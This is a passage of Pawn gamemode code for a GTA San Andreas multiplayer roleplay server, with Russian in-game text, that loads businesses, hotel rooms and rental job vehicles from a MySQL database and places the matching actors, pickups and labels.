			        GetVehiclePos(vehicleid, veh__pos[vehicleid][0], veh__pos[vehicleid][1], veh__pos[vehicleid][2]);
	    			GetVehicleZAngle(vehicleid, veh__pos[vehicleid][3]);
			    }
			}
	    }
    }
	return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	if(response == EDIT_RESPONSE_CANCEL)
	{
		DestroyObject(modelid);
		CancelEdit(playerid);
	}
	if(response == EDIT_RESPONSE_FINAL)
	{
	    CancelEdit(playerid);
		new str[200];
		format(str,sizeof(str),"SetPlayerAttachedObject(playerid, %d, %d, %d, %f, %f, %f, %f, %f, %f, %f, %.2f, %f);", index, GetPVarInt(playerid,"ID"), boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
		SendClientMessage(playerid,-1,str);

	}
	if(!IsPlayerInAnyVehicle(playerid)) SetPlayerAttachedObject(playerid, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
	else AttachDynamicObjectToVehicle(GetPVarInt(playerid, "VehicleObj"), GetPlayerVehicleID(playerid), fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ);
}
stock IsInv(carid){switch(GetVehicleModel(carid)){case 481,509,510:return true;}return false;}
stock IsABike(vid)
{
	new modelid = GetVehicleModel(vid);
	if(modelid ==581||modelid ==522||modelid ==521||modelid ==523||modelid ==586||modelid ==448||modelid ==461||modelid ==463||modelid ==468||modelid ==471) return true;
	else return false;
}
stock IsABus(vid)
{
	new modelid = GetVehicleModel(vid);
	switch(modelid)
	{
	    case 483, 588, 431, 437,508: modelid = 1;
 		default: modelid = 0;
 	}
 	return modelid;
}
stock IsAGruz(vid)
{
	new modelid = GetVehicleModel(vid);
	switch(modelid)
	{
	    case 403, 406, 407, 408, 414, 416, 423, 427, 428, 432, 433, 443, 455, 456, 486, 498, 499, 514, 515, 524, 531, 532, 544, 573, 578, 601, 609: modelid = 1;
 		default: modelid = 0;
 	}
 	return modelid;
}

stock IsLowRide(carid){switch(GetVehicleModel(carid)){case 412, 534, 535, 536, 566, 567, 575, 576:return true;}return false;}
function ClearAnim(playerid)
{
    printf("2 | %d",GetPVarInt(playerid,"Kach"));
	if(GetPVarInt(playerid,"Kach"))
	{
	    printf("3 | %d",GetPVarInt(playerid,"Kach"));
		if(IsPlayerAttachedObjectSlotUsed(playerid, 0)) RemovePlayerAttachedObject(playerid, 0);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		DeletePVar(playerid,"Kach");
	}
	return ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,0,0,0,0,0,1);
}

stock PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
	return false;
}
/*static ProdCena[][] = {
{650,700,2000,6000,6500,8000,9500,500,1500,0,0,0},
{300,150,550,400,600,300,1000,500,850,150,0,0},
{80,200,320,400,110,0,0,0,0,0,0,0},
{80,200,320,400,110,0,0,0,0,0,0,0},
{50,120,339,359,379,399,0,0,0,0,0,0},
{50,120,339,359,379,399,0,0,0,0,0,0},
{50,120,339,359,379,399,0,0,0,0,0,0},
{80,200,320,400,110,0,0,0,0,0,0,0},
{0,0,0,0,0,0,0,0,0,0,0,0},
{20,0,0,0,0,0,0,0,0,0,0,0},
{0,0,0,0,0,0,0,0,0,0,0,0},
{900,0,0,0,0,0,0,0,0,0,0,0},
{900,0,0,0,0,0,0,0,0,0,0,0},
{50,120,339,359,379,399,200,200,120,280,280,400}
};

static ProdName[][] = {"Кастет","Бита","Дымовая шашка (10 шт.)","Desert Eagle (60 пт.)","Shotgun (30 пт.)","AK-47 (90 пт.)","Country Rifle (30 пт.)","Тир","Бронежилет"};
static ProdName1[][] = {"Телефон","Сим-карта","Аптечка","Маска","Верёвка","Трость","Парашют","Пачка сигарет","Шашка \"Такси\"","Балончик с краской"};
static ProdName2[][] = {"Бургер","Меню \"Эконом-шот\"","Меню \"Стардарт-шот\"","Меню \"Роял-шот\"","Газировка \"Sprunk\""};
static ProdName3[][] = {"Бургер","Эконом меню","Стандартное меню","Королевское меню","Газировка \"Sprunk\""};
static ProdName4[][] = {"Сигара","Газировка \"Sprunk\"","Пиво","Вино","Виски","Абсент"};
static ProdName5[][] = {"Сигара","Газировка \"Sprunk\"","Пиво","Вино","Виски","Абсент"};
static ProdName6[][] = {"Сигара","Газировка \"Sprunk\"","Пиво","Вино","Виски","Абсент"};
static ProdName7[][] = {"Кусок пиццы","Кусок пиццы с картошкой","Средняя пицца с напитком","Большая пицца","Газировка \"Sprunk\""};
static ProdName9[][] = {"Литр"};

static ProdName11[][] = {"Команта"};
static ProdName12[][] = {"Команта"};
static ProdName13[][] = {"Сигара","Газировка \"Sprunk\"","Пиво","Вино","Виски","Абсент","Пицца \"Моцарелла\"","Пицца \"Маргарита\"","Салат \"Цезарь\"","Равиоли Карбонара","Лазанья \"Болоньезе\"","Паста \"Четыре моря\""	};
static ProdMin[][] = {
	{1,1,2,6,6,6,1,3,0,0,0},
	{2,1,1,1,1,1,3,1,2,0,0},
	{1,2,2,3,1,0,0,0,0,0,0,0},
	{1,2,2,3,1,0,0,0,0,0,0,0},
	{1,1,2,3,3,4,0,0,0,0,0,0},
	{1,1,2,3,3,4,0,0,0,0,0,0},
	{1,1,2,3,3,4,0,0,0,0,0,0},
	{1,2,2,3,1,0,0,0,0,0,0,0},
	{0,0,0,0,0,0,0,0,0,0,0,0},
	{1,0,0,0,0,0,0,0,0,0,0,0},
	{0,0,0,0,0,0,0,0,0,0,0,0},
	{0,0,0,0,0,0,0,0,0,0,0,0},
	{0,0,0,0,0,0,0,0,0,0,0,0},
	{1,1,2,3,4,2,2,1,2,2,3}
};

*/

stock LoadBizz()
{
    
    new Cache:result = mysql_query(mysql, "SELECT * FROM `biz`");
	TOTALBIZ = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALBIZ;idx ++)
	{
		cache_get_row(idx-1, 1, BizInfo[idx][bName], mysql, 32);
		cache_get_row(idx-1, 2, BizInfo[idx][bOwner], mysql, 24);
		BizInfo[idx][bX] = cache_get_row_float(idx-1, 3, mysql);
		BizInfo[idx][bY] = cache_get_row_float(idx-1, 4, mysql);
		BizInfo[idx][bZ] = cache_get_row_float(idx-1, 5, mysql);
		BizInfo[idx][bXX] = cache_get_row_float(idx-1, 6, mysql);
		BizInfo[idx][bYY] = cache_get_row_float(idx-1, 7, mysql);
		BizInfo[idx][bZZ] = cache_get_row_float(idx-1, 8, mysql);
		BizInfo[idx][bInt] = cache_get_row_int(idx-1, 9, mysql);
		BizInfo[idx][bProd] = cache_get_row_int(idx-1, 10, mysql);
		BizInfo[idx][bMoney] = cache_get_row_int(idx-1, 11, mysql);
		BizInfo[idx][bTill] = cache_get_row_int(idx-1, 12, mysql);
		BizInfo[idx][bType] = cache_get_row_int(idx-1, 13, mysql);
		BizInfo[idx][bPrice] = cache_get_row_int(idx-1, 14, mysql);
		BizInfo[idx][bXX1] = cache_get_row_float(idx-1, 15, mysql);
		BizInfo[idx][bYY1] = cache_get_row_float(idx-1, 16, mysql);
		BizInfo[idx][bZZ1] = cache_get_row_float(idx-1, 17, mysql);
		BizInfo[idx][bLockTime] = cache_get_row_int(idx-1, 18, mysql);
		BizInfo[idx][bMafia] = cache_get_row_int(idx-1, 19, mysql);
		BizInfo[idx][bZeml] = cache_get_row_int(idx-1, 20, mysql);
		cache_get_row(idx-1, 21, BizInfo[idx][bMen], mysql, 24);
		BizInfo[idx][bVhod] = cache_get_row_int(idx-1, 22, mysql);
		BizInfo[idx][bOhr] = cache_get_row_int(idx-1, 23, mysql);
		BizInfo[idx][bLock] = cache_get_row_int(idx-1, 24, mysql);
		BizInfo[idx][bUl][0] = cache_get_row_int(idx-1, 25, mysql);
		BizInfo[idx][bUl][1] = cache_get_row_int(idx-1, 26, mysql);
		BizInfo[idx][bUl][2] = cache_get_row_int(idx-1, 27, mysql);
		BizInfo[idx][bAkc] = cache_get_row_int(idx-1, 28, mysql);
		BizInfo[idx][bAkcP] = cache_get_row_int(idx-1, 29, mysql);
		BizInfo[idx][bAkcAll] = cache_get_row_int(idx-1, 30, mysql);
		BizInfo[idx][bUl][3] = cache_get_row_int(idx-1, 31, mysql);
		BizInfo[idx][bZvuk]  = cache_get_row_int(idx-1, 32, mysql);
		BizInfo[idx][bUl][4] = cache_get_row_int(idx-1, 31, mysql);
		BIZPIC[idx] = CreateDynamicPickup(19132,23,BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],0);
		if(BizInfo[idx][bType] != 10) CreateDynamic3DTextLabel( "Для выхода используйте: {f7ae11}LALT", -1,BizInfo[idx][bXX],BizInfo[idx][bYY],BizInfo[idx][bZZ],10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
		else CreateDynamic3DTextLabel( "Для выхода используйте: {f7ae11}LALT", -1,-27.3143,-58.2692,1003.5469,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
		if(idx == 1) continue;
		BizzLable[idx] = Create3DTextLabelEx( "-", -1,BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ]+1,10.0, 0, 1 );
		UpdateBiz(idx);
		
		//BIZPIC[idx] = CreateDynamicPickup(19132,23,BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],0);
		query = "";
        format(query, sizeof(query), "SELECT * FROM bizprice WHERE idbizz = '%d'", idx);
		mysql_tquery(mysql, query, "ShowHui","d",idx);
		switch(BizInfo[idx][bType])
		{
		    case 1:
			{
			    query = "";
			   // printf("аммо ёпт %i",idx);
                format(query, sizeof(query), "UPDATE `biz` SET `price` = '100000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(179,295.8331,-82.6508,1001.5156,357.8721,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,295.8331,-82.6508,1002.5156,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],6, 0,-1,-1,-1,200.0);

			//	SetBizInt(idx,"price",1000000);
			}
			case 2:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '110000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(221,-23.7369,-57.3090,1003.5469,354.9292,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, -23.7369,-57.3090,1004.5469,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],56, 0,-1,-1,-1,200.0);
       
	
			//	SetBizInt(idx,"price",1100000);

			}
			case 3:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '80000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(205,375.8562,-65.8491,1001.5078,177.4931,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 375.8562,-65.8491,1002.5078,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],10, 0,-1,-1,-1,200.0);
    
		//		SetBizInt(idx,"price",700000);

			}
			case 4:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '80000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(167,368.0333,-4.4919,1001.8516,182.7025,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 368.0333,-4.4919,1002.8516,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],14, 0,-1,-1,-1,200.0);
	

		//		SetBizInt(idx,"price",700000);
			}
			case 5:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '80000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(100,500.1024,-77.5636,998.7578,354.7999,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 500.1024,-77.5636,999.7578,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],49, 0,-1,-1,-1,200.0);
	
			//	SetBizInt(idx,"price",700000);
			}
			case 6:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '80000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
			    BIZBOT[idx] = CreateDynamicActor(55,501.8481,-20.8618,1000.6797,89.0646,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 501.8481,-20.8618,1001.6797,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],48, 0,-1,-1,-1,200.0);

	
				//alhambra
			}
			case 7:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '80000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 1215.4764,-15.2613,1001.9219,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],48, 0,-1,-1,-1,200.0);
				BIZBOT[idx] = CreateDynamicActor(55,1215.4764,-15.2613,1000.9219,353.6169,1,100.0,idx);
  
		//		SetBizInt(idx,"price",700000);
			}
			case 8:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '80000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(155,374.6826,-117.2784,1001.4922,179.9198,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 374.6826,-117.2784,1002.4922,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],29, 0,-1,-1,-1,200.0);
            
	
		//		SetBizInt(idx,"price",700000);
			}
			case 9:
			{
				BIZBOT[idx] = CreateDynamicActor(303,820.1865,1.9216,1004.1797,270.4329,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 820.1865,1.9216,1005.1797,10.0, idx, 0 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],11, 0,-1,-1,-1,200.0);

			}
			case 10:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '120000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(221,-23.7369,-57.3090,1003.5469,354.9292,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, -23.7369,-57.3090,1004.5469,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],55, 0,-1,-1,-1,200.0);
				Create3DTextLabelEx( "Для заправки используйте: {f7ae11}/fuel", -1,BizInfo[idx][bXX],BizInfo[idx][bYY],BizInfo[idx][bZZ],10.0, 0, 0 );
	
		//		SetBizInt(idx,"price",1200000);
			}
			case 11,15,16:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '90000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
			    switch(BizInfo[idx][bType])
			    {
			        case 11:
			        {
			        	BIZBOT[idx] = CreateDynamicActor(221,204.8533,-8.0070,1001.2109,266.0146,1,100.0,idx);
						BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 204.8533,-8.0070,1002.2109,10.0, idx, 1 );
			        }
			        case 15:
			        {
			        	BIZBOT[idx] = CreateDynamicActor(221,161.3947,-81.1919,1001.8047,177.1105,1,100.0,idx);
						BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 161.3947,-81.1919,1002.8047,10.0, idx, 1 );
			        }
			        case 16:
			        {
			        	BIZBOT[idx] = CreateDynamicActor(221,207.6614,-98.7048,1005.2578,181.1196,1,100.0,idx);
						BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 207.6614,-98.7048,1006.2578,10.0, idx, 1 );
			        }
			    }
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],45, 0,-1,-1,-1,200.0);
		//		SetBizInt(idx,"price",1000000);
			}
			case 12:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '400000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
			    //printf("HOTEL %d",idx);
				BIZBOT[idx] = CreateDynamicActor(221,1398.9728,-20.1940,1000.8685,95.4479,1,100.0,idx);
				//printf("///////////////1");
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 1398.9728,-20.1940,1001.8685,10.0, idx, 0 );
				//printf("///////////////2");
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],19, 0,-1,-1,-1,200.0);
			//	printf("///////////////3");
				hotelpic[48-idx] = CreateDynamicPickup(1318,23,1392.5846,-33.0893,1000.8685,idx);
			//	printf("///////////////4");
				if(idx == 45)
				{
					CreateDynamicPickup(19134,23,2161.0654,2221.4045,10.8203,0);
					parkingzone[0] = CreateDynamicSphere(2161.0654,2221.4045,10.8203, 2.0);
					CreateDynamic3DTextLabel("Подземный паркинг\nИспользуйте: {f7ae11}H",0xFFFFFFFF,2161.0654,2221.4045,10.8203+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 0);
				}
				else
				{
					CreateDynamicPickup(19134,23,1638.9957,-1684.1675,13.2079,0);
					parkingzone[1] = CreateDynamicSphere(1638.9957,-1684.1675,13.2079, 2.0);
					CreateDynamic3DTextLabel("Подземный паркинг\nИспользуйте: {f7ae11}H",0xFFFFFFFF,1638.9957,-1684.1675,13.2079+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 0);
				}
				CreateDynamicPickup(19134,23,2435.5957,2271.3696,991.1752,idx);
				CreateDynamicPickup(19134,23,2435.5957,2271.3696,991.1752,idx);
				pickuplift[0] = CreateDynamicPickup(1318,23,2481.2061,2261.4524,991.6547,idx);
				pickuplift[1] = CreateDynamicPickup(1318,23,2481.2061,2261.4524,991.6547,idx);
				CreateDynamic3DTextLabel("Выезд\nИспользуйте: {f7ae11}H",0xFFFFFFFF,2435.5957,2271.3696,991.1752+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
				CreateDynamic3DTextLabel("Выезд\nИспользуйте: {f7ae11}H",0xFFFFFFFF,2435.5957,2271.3696,991.1752+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
            //    SetBizInt(idx,"price",3000000);
			//	printf("///////////////5");
			}

			case 13:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '200000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(221,1306.9800,-1341.9086,2001.5759,0.6776,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1, 1306.9800,-1341.9086,2002.5759,10.0, idx, 0 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],19, 0,-1,-1,-1,200.0);
				hotelpic[48-idx] = CreateDynamicPickup(1318,23,1300.2125,-1347.0293,2001.4359,idx);

				hotelpic1[hotelvirt[48-idx][0]-1] = CreateDynamicPickup(1318,23,1092.6976,-891.2585,2001.0859,hotelvirt[48-idx][0]);
				hotelpic1[hotelvirt[48-idx][1]-1] = CreateDynamicPickup(1318,23,1092.6976,-891.2585,2001.0859,hotelvirt[48-idx][1]);
				if(idx == 47)
				{
					CreateDynamicPickup(19134,23,-221.3990,1090.5668,19.7422,0);
					parkingzone[2] = CreateDynamicSphere(-221.3990,1090.5668,19.7422, 2.0);
					CreateDynamic3DTextLabel("Подземный паркинг\nИспользуйте: {f7ae11}H",0xFFFFFFFF,-221.3990,1090.5668,19.7422+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 0);
				}
				else
				{
					CreateDynamicPickup(19134,23,-161.8579,1102.7373,19.3526,0);
					parkingzone[3] = CreateDynamicSphere(-161.8579,1102.7373,19.3526, 2.0);
					CreateDynamic3DTextLabel("Подземный паркинг\nИспользуйте: {f7ae11}H",0xFFFFFFFF,-161.8579,1102.7373,19.3526+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 0);
				}
				CreateDynamicPickup(19134,23,2435.5957,2271.3696,991.1752,idx);
				CreateDynamicPickup(19134,23,2435.5957,2271.3696,991.1752,idx);
				pickuplift[2] = CreateDynamicPickup(1318,23,2481.2061,2261.4524,991.6547,idx);
				pickuplift[3] = CreateDynamicPickup(1318,23,2481.2061,2261.4524,991.6547,idx);
				CreateDynamic3DTextLabel("Выезд\nИспользуйте: {f7ae11}H",0xFFFFFFFF,2435.5957,2271.3696,991.1752+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
				CreateDynamic3DTextLabel("Выезд\nИспользуйте: {f7ae11}H",0xFFFFFFFF,2435.5957,2271.3696,991.1752+2.0,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
            //    SetBizInt(idx,"price",2000000);
			}
			case 14:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '80000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(221,-786.9160,498.3215,1371.7422,358.8668,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,-786.9160,498.3215,1372.7422,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],50, 0,-1,-1,-1,200.0);
				
      
			//	SetBizInt(idx,"price",700000);
			}
			case 17:
			{
			    query = "";
			    format(query, sizeof(query), "UPDATE `biz` SET `price` = '90000' WHERE id = '%d' LIMIT 1",idx);
				mysql_tquery(mysql,query);
				BIZBOT[idx] = CreateDynamicActor(221,9.0099,0.8488,1996.2479,88.7766,1,100.0,idx);
				BotLable[idx] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,9.0099,0.8488,1997.2479,10.0, idx, 1 );
				CreateDynamicMapIcon(BizInfo[idx][bX],BizInfo[idx][bY],BizInfo[idx][bZ],45, 0,-1,-1,-1,200.0);
	
			//	SetBizInt(idx,"price",1000000);
			}
		}
	}
	cache_delete(result, mysql);
	return 1;
}


CMD:setbizprod(playerid,params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6|| AdminLogged[playerid] == false ) return true;
    if(sscanf(params, "i",params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /setbizprod [кол-во]");
	for(new i = 1;i<TOTALBIZ;i++) if(IsPlayerInRangeOfPoint(playerid, 10.0,BizInfo[i][bX],BizInfo[i][bY],BizInfo[i][bZ])) BizInfo[i][bProd] = params[0],SetBizInt(i,"prod",params[0]);
    SendClientMessage(playerid,-1,"Вы выдали продукты данному бизнесу");
	return true;
}

stock LoadKom()
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `komnata`");
	TOTALKOM = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALKOM;idx ++)
	{
	    KomInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
	    cache_get_row(idx-1, 1, KomInfo[idx][kOwner], mysql, 24);
	    KomInfo[idx][kbiz] = cache_get_row_int(idx-1, 2, mysql);
	    KomInfo[idx][kvirt] = cache_get_row_int(idx-1, 3, mysql);
	    KomInfo[idx][kX] = cache_get_row_float(idx-1, 4, mysql);
	    KomInfo[idx][kY] = cache_get_row_float(idx-1, 5, mysql);
	    KomInfo[idx][kZ] = cache_get_row_float(idx-1, 6, mysql);
	    KomInfo[idx][kOplata] = cache_get_row_int(idx-1, 7, mysql);
	    KomInfo[idx][kNum] = cache_get_row_int(idx-1, 8, mysql);
	    if(KomInfo[idx][kvirt])
		{
			if(!strcmp(KomInfo[idx][kOwner],"None",true))
			{
				static const fmt_string2[] = "Комната {f7ae11}№%i{ffffff}\nВойти: {f7ae11}LALT";
				new str2[sizeof(fmt_string2)+3];
				format(str2, sizeof(str2), fmt_string2,KomInfo[idx][kNum]);
				KomInfo[idx][kText] = Create3DTextLabelEx( str2, -1, KomInfo[idx][kX],KomInfo[idx][kY],KomInfo[idx][kZ]+0.5, 3.0, KomInfo[idx][kvirt], 1 );
			}
			else
			{
				static const fmt_string2[] = "Комната {f7ae11}№%i{ffffff}\nВладелец: {f7ae11}%s{ffffff}\nВойти: {f7ae11}LALT";
				new str2[sizeof(fmt_string2)+3+24];
				format(str2, sizeof(str2), fmt_string2,KomInfo[idx][kNum],KomInfo[idx][kOwner]);
				KomInfo[idx][kText] = Create3DTextLabelEx( str2, -1, KomInfo[idx][kX],KomInfo[idx][kY],KomInfo[idx][kZ]+0.5, 3.0, KomInfo[idx][kvirt], 1 );
			}
			CreateDynamic3DTextLabel("Для выхода используйте: {f7ae11}LALT", -1,-0.1794,-8.1853,1996.0859,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
		}
		//if(KomInfo[idx][kNum] % 2 == 0)  CreateDynamic3DTextLabel("Для выхода используйте: {f7ae11}LALT", -1,2319.2402,2114.6265,1021.8715,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
		else CreateDynamic3DTextLabel("Для выхода используйте: {f7ae11}LALT", -1,1281.0703,-36.1240,1000.9205,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, idx);
	}

	printf(" [LOAD]: Успешная загрузка 'LoadKom' - загружено %d", TOTALKOM);
	cache_delete(result, mysql);
}
stock LoadCJ()
{
    new Cache:result = mysql_query(mysql, "SELECT * FROM `carjob`");
    new obj;
	TOTALCJ = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALCJ;idx ++)
	{
	    CarJob[idx][jid] = cache_get_row_int(idx-1, 0, mysql);
	    CarJob[idx][jX] = cache_get_row_float(idx-1, 1, mysql);
	    CarJob[idx][jY] = cache_get_row_float(idx-1, 2, mysql);
	    CarJob[idx][jZ] = cache_get_row_float(idx-1, 3, mysql);
	    CarJob[idx][jFa] = cache_get_row_float(idx-1, 4, mysql);
	    CarJob[idx][jcolor1] = cache_get_row_int(idx-1, 5, mysql);
	    CarJob[idx][jcolor2] = cache_get_row_int(idx-1, 6, mysql);
	    CarJob[idx][jbiz] = cache_get_row_int(idx-1, 7, mysql);
	    CarJob[idx][jidcar] = cache_get_row_int(idx-1, 8, mysql);
	    CarJob[idx][jcarpr] = cache_get_row_int(idx-1, 9, mysql);
	    if(CarJob[idx][jidcar] != 0) CarJob[idx][jcar] = CreateVehicle(CarJob[idx][jidcar],CarJob[idx][jX],CarJob[idx][jY],CarJob[idx][jZ],CarJob[idx][jFa],CarJob[idx][jcolor1],CarJob[idx][jcolor2],-1),Fuel[CarJob[idx][jcar]] = 100;
        RentCar[CarJob[idx][jcar]] = -1;
	 	CarLable[CarJob[idx][jcar]] = CreateDynamic3DTextLabel( " ", -1, 0.0, 0.0, 1.3, 10.0, INVALID_PLAYER_ID, CarJob[idx][jcar], 1 );
        switch(CarJob[idx][jidcar])
        {
            case 514,403,515:
            {
                UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Дальнобойщик\n{f7ae11}[Аренда]");
            }
            case 456: UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Развозчик\n{f7ae11}[Аренда]");
            case 525: UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Механик\n{f7ae11}[Аренда]");
            case 437: UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Автобус\n{f7ae11}[Аренда]");
            case 420:
			{
			    UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Такси\n{f7ae11}[Аренда]");
			    obj = CreateDynamicObject(19327,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
				SetDynamicObjectMaterialText(obj, 0, "{FFFFFF}- TAXI SA -", 90, "Calibri", 20, 0, 0, 0, 0);
				AttachDynamicObjectToVehicle(obj, CarJob[idx][jcar], 0.740, -1.945, 0.348, -57.200, 0.000, 0.000);

				obj = CreateDynamicObject(19327,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
